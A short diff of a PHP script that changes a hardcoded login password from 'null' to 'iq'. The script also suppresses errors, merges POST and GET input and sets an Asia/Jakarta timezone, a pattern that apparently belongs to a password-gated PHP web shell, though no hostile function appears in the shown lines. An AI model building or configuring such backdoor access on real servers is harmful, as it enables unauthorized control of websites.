@@ -10,7 +10,7 @@ error_reporting(0);
 session_start();
 date_default_timezone_set("Asia/Jakarta");
 $nana = array_merge($_POST, $_GET);
-$pwd = "null"; // password
+$pwd = "iq"; // password
 if(empty($_SESSION['login'])) {
 ?>
 <html>
